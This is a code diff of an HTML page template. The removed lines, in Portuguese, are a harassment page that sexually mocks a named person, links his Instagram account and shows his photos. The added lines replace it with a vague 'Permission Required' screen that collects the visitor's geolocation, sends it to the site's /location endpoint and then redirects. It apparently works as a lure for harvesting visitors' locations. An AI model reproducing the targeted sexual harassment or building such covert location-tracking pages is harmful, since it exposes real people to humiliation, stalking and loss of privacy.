@@ -3,21 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
-    <title>maikuzera</title>
+    <title>Welcome</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
 </head>
 <body>
-    <h1>O site foi criado na intencao de arranjar pareceiros sexuais pro gay do mk!</h1>
-    <p>interessados chama na dm dele.</p>
-    <a href="https://www.instagram.com/_allvesyzz/">Instagram do mk</a>
-    <p>fotos do mano:</p>
-    
-    <img src="{{ url_for('static', filename='maikuzera.jpg') }}" alt="maikuzera" class="maikuzera">
+    <div id="request-location">
+        <h1>Permission Required</h1>
+        <p>Please allow location access to continue</p>
+        <button onclick="getLocation()">Allow Location</button>
+    </div>
 
-    <img src="{{ url_for('static', filename='maikuzera1.jpg') }}" alt="maikuzera1" class="maikuzera1">
-
-    <img src="{{ url_for('static', filename='maikuzera2.jpg') }}" alt="maikuzera2" class="maikuzera2">
-    
-    <p>NOTA: ele tem preferencia por travesti mas aceita negoes tbm,ele geralmente gosta d levar!,por ser muito apertado ele so aceita ate 22cm se for mais q isso ele fala q machuca mt!</p>
+    <script>
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    fetch('/location', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        })
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            window.location.href = "/conteudo";
+                        } else {
+                            alert("Error saving location");
+                        }
+                    })
+                    .catch(error => {
+                        alert("Connection error");
+                    });
+                },
+                (error) => {
+                    alert("Location access is required to continue");
+                }
+            );
+        } else {
+            alert("Geolocation is not supported by your browser");
+        }
+    }
+    </script>
 </body>
 </html>
